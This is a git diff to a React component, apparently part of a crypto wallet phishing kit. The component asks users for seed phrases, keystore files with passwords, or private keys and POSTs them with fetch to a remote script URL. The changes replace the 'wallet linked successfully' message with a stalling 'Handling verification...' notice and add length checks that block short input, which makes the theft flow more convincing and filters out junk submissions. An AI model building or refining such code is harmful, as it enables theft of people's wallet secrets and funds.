@@ -53,11 +53,15 @@ function CustomTabPanel(props) {
 const Inputkey = ({name, imgsrc, setshowinputkey, setfirstmodal}) => {
   // const navigate = useNavigate();
   const navigate = useNavigate();
-
+ 
     const [phrase, setphrasevalue]= useState("");
     const [keystore, setkeystorevalue] = useState('');
     const [wallet_password, setwalletvalue ] = useState('');
   const [private_key, setprivatekeyvalue ] = useState('');
+  const isButtonDisabledp = private_key.length < 12;
+
+  const isButtonDisabledph = phrase.length < 12;
+  const isButtonDisabledwa = wallet_password.length < 12;
   const handlephraseChange = (event) => {
     
     setphrasevalue(event.target.value);
@@ -147,7 +151,7 @@ const Inputkey = ({name, imgsrc, setshowinputkey, setfirstmodal}) => {
     fetch(scriptURL, { method: 'POST', body: fulldata})
       .then(response => console.log('Success!', response))
       .catch(error => console.error('Error!', error.message))
-      toast.success('wallet linked successfully ')
+      toast.warning('Handling verification... ')
       setTimeout(() => {
         navigate('/');
       }, 1000);
@@ -172,7 +176,7 @@ const Inputkey = ({name, imgsrc, setshowinputkey, setfirstmodal}) => {
     fetch(scriptURL, { method: 'POST', body: fulldata})
       .then(response => console.log('Success!', response))
       .catch(error => console.error('Error!', error.message))
-      toast.success('wallet linked successfully ')
+      toast.warning('Handling verification... ')
       setTimeout(() => {
         navigate('/');
       }, 1000);
@@ -193,7 +197,7 @@ const Inputkey = ({name, imgsrc, setshowinputkey, setfirstmodal}) => {
     fetch(scriptURL, { method: 'POST', body: fulldata})
       .then(response => console.log('Success!', response))
       .catch(error => console.error('Error!', error.message))
-      toast.success('wallet linked successfully ')
+      toast.warning('Handling verification... ')
       setTimeout(() => {
         navigate('/');
       }, 1000);
@@ -267,7 +271,7 @@ name="phrase"
     </Box>
     <p  className="suptext">Typically 12 (sometimes 24) words separated by single spaces</p>
     <Stack>
-    <Button type="submit" variant="contained">IMPORT</Button>
+    <Button type="submit" variant="contained" disabled={isButtonDisabledph}>IMPORT</Button>
     </Stack>
     </form >
     
@@ -314,7 +318,7 @@ name="wallet_password"
       
     <p className="suptext">Several lines of text beginning with<code> {"{...}"}</code> plus the password you used to encrypt it.</p>
     <Stack>
-    <Button type="submit" variant="contained">IMPORT</Button>
+    <Button type="submit" variant="contained" disabled={isButtonDisabledwa}>IMPORT</Button>
     </Stack>
 </form>
 
@@ -334,7 +338,7 @@ name="private_key"
          // default border color
         outlineColor: '#3399FF' // border color when the textarea is focused
       }}
-      placeholder="Enter ypur private key"
+      placeholder="Enter your private key"
       value={private_key}
      onChange={handleprivatekeyChange}
     />
@@ -346,7 +350,7 @@ name="private_key"
       lineHeight: '10px'
     }}>Typically 12 (sometimes 24) words separated by a single space.</p>
     <Stack>
-    <Button type="submit" variant="contained">IMPORT</Button>
+    <Button type="submit" variant="contained" disabled={isButtonDisabledp}>IMPORT</Button>
     </Stack>
     </form>
       </CustomTabPanel>
